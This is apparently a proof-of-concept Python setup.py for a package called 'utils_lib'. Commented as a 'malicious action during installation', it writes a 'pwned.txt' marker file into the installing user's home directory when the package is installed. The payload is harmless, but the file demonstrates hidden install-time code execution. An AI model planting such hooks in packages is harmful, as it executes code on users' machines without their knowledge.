from setuptools import setup
import os

# malicious action during installation
home = os.path.expanduser("~")
with open(os.path.join(home, "pwned.txt"), "w") as f:
    f.write("Infiltrated by utils_lib v2")


setup(
    name="utils_lib",
    version="1.0.0",
    packages=["utils_lib"],  # this MUST match the inner folder name
)
